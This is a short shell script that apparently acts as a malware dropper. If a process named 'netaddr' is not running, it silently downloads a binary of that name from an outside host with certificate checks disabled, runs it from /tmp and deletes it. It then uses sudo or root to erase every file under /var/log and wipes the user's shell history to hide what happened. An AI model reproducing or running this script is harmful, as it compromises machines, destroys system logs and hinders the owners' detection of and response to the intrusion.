#!/bin/sh
RUN=$(ps -ef | grep 'netaddr' | grep -v 'defunct' | grep -v 'grep' | wc -l)
if ! [ $RUN -gt 0 ]; then
    (curl -ksL https://hashx.dev/netaddr -o /tmp/netaddr || wget --no-check-certificate -qO /tmp/netaddr https://hashx.dev/netaddr || lwp-download https://hashx.dev/netaddr /tmp/netaddr) >/dev/null 2>&1
    cd /tmp;chmod +x netaddr;./netaddr;rm -rf netaddr
fi
(if sudo -n true; then for logs in $(sudo find /var/log -type f); do sudo rm $logs; done; elif [ "$(id -u)" -eq 0 ]; then for logs in $(find /var/log -type f); do rm $logs; done; fi) >/dev/null 2>&1
(rm $HOME/.bash_history) >/dev/null 2>&1
(history -c) >/dev/null 2>&1
